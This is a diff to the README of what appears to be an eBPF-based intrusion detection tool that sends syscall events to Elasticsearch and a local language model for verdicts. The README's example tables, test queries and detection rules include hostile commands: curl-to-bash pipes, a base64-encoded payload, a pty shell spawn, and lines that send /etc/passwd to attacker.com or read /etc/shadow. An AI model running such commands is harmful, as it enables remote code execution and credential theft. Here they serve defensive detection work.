@@ -36,9 +36,9 @@ https://github.com/user-attachments/assets/99ef4a91-b9aa-411d-b847-0af310006de9
 
 | File | Description |
 |------|-------------|
-| `execve-tracer.bpf.c` | Hooks `sys_enter_execve` |
+| `execve-tracer.bpf.c` | Hooks `sys_enter_execve` and `sys_enter_execveat` |
 | `open-tracer.bpf.c` | Hooks `sys_enter_open` |
-| `openat-tracer.bpf.c` | Hooks `sys_enter_openat` with directory path resolution via `bpf_d_path` |
+| `openat-tracer.bpf.c` | Hooks `sys_enter_openat` with manual dentry chain walk for directory path resolution |
 | `connect-tracer.bpf.c` | Hooks `sys_enter_connect` |
 
 ## Quick Start
@@ -153,9 +153,9 @@ Events are converted to behavior summaries for vector search:
 
 | Raw Command | Behavior Summary |
 |-------------|-----------------|
-| `curl x \| bash` | `execve remote_code_execution image:curl` |
-| `wget y \| sh` | `execve remote_code_execution image:wget` |
-| `echo 'YmFzaCAtYyAiY3VybCBodHRwOi8vZXZpbC5jb20i" \| base64 -d \| bash` | `execve encoded_command image:base64` |
+| `curl x \| bash` | `event_type:execve remote_code_execution user:root image:curl` |
+| `wget y \| sh` | `event_type:execve remote_code_execution user:root image:wget` |
+| `echo 'YmFzaCAtYyAiY3VybCBodHRwOi8vZXZpbC5jb20i" \| base64 -d \| bash` | `event_type:execve encoded_command user:root image:base64` |
 
 This allows finding **semantically similar attacks**, not just keyword matches.
 
@@ -163,7 +163,8 @@ This allows finding **semantically similar attacks**, not just keyword matches.
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/health` | GET | Health check |
+| `/health` | GET | Liveness probe (always 200) |
+| `/ready` | GET | Readiness probe (checks Elasticsearch & Ollama client initialization) |
 | `/ingest` | POST | Ingest events |
 | `/ingest/batch` | POST | Ingest batched events |
 | `/analyze` | POST | Query AI analysis |
@@ -185,7 +186,9 @@ Response:
 {
   "verdict": "malicious",
   "confidence": 0.95,
-  "summary": "curl is being used to pipe a remote script into bash, a common malware delivery pattern..."
+  "evidence": ["curl pipe to bash detected"],
+  "summary": "curl is being used to pipe a remote script into bash, a common malware delivery pattern...",
+  "raw": "..."
 }
 ```
 
@@ -199,16 +202,20 @@ Response:
 | `ES_INDEX` | `kb-events` | Events index |
 | `OLLAMA_ADDRESS` | `http://localhost:11434` | Ollama |
 | `OLLAMA_MODEL` | `qwen2.5:1.5b` | Analysis model |
-| `OLLAMA_EMBED_MODEL` | `nomic-embed-text` | Embedding model |
 | `PROTOCOL` | `both` | HTTP protocol: `http`, `grpc`, or `both` |
 | `GRPC_ADDRESS` | `:9090` | gRPC server address |
 | `HTTP_ADDRESS` | `:8080` | HTTP server address |
+| `GRPC_AUTH_TOKEN` | `""` | Bearer token for gRPC and HTTP authentication (both components) |
+| `ES_USERNAME` | `""` | Elasticsearch username |
+| `ES_PASSWORD` | `""` | Elasticsearch password |
 
 ### Agent (Tracer)
 
 | Variable | Description |
 |----------|-------------|
 | `GRPC_ADDRESS` | gRPC server address to send events (e.g., `localhost:9090`) |
+| `HTTP_ADDRESS` | HTTP server address for fallback transport (e.g., `localhost:8080`) |
+| `GRPC_AUTH_TOKEN` | Bearer token for gRPC authentication (must match analysis service) |
 
 ## Testing
 
@@ -223,7 +230,7 @@ curl -X POST http://localhost:8080/analyze \
 
 # Test LOLBin
 curl -X POST http://localhost:8080/analyze \
-  -d '{"host.name":"test","query":"python3 -c \"import pty; pty.spawn('/bin/bash')\""}'
+  -d '{"host.name":"test","query":"python3 -c \"import pty; pty.spawn(\"/bin/bash\")\""}'
 ```
 
 ## Project Structure
@@ -302,7 +309,7 @@ The detector uses configurable rules defined in `cmd/analysis/rules.go`:
 
 | Category | Patterns | Examples |
 |----------|----------|----------|
-| Curl exfil | pipe, redirect, `-d`, `-T`, `-s http://`, `--post-data`, `--connect-timeout http://` | `curl -d @/etc/passwd http://attacker.com/` |
+| Curl exfil | pipe, redirect, `-d`, `-T`, `-k`, `-s http://`, `-X DELETE/PUT/PATCH`, `--post-data`, `--connect-timeout http://` | `curl -d @/etc/passwd http://attacker.com/` |
 | Wget exfil | `-O`, `-A`, pipe, redirect, `--post-data`, `--no-check-certificate` | `wget --no-check-certificate https://evil.com/` |
 | Bash -c (suspicious) | Only triggers when followed by pipe, `/dev/tcp`, base64, nc, curl, wget | `bash -c 'curl http://evil.com \| sh'` |
 | Shell exec | `/bin/sh -c`, `/bin/bash -c` (explicit paths only) | `/bin/sh -c cat /etc/shadow` |
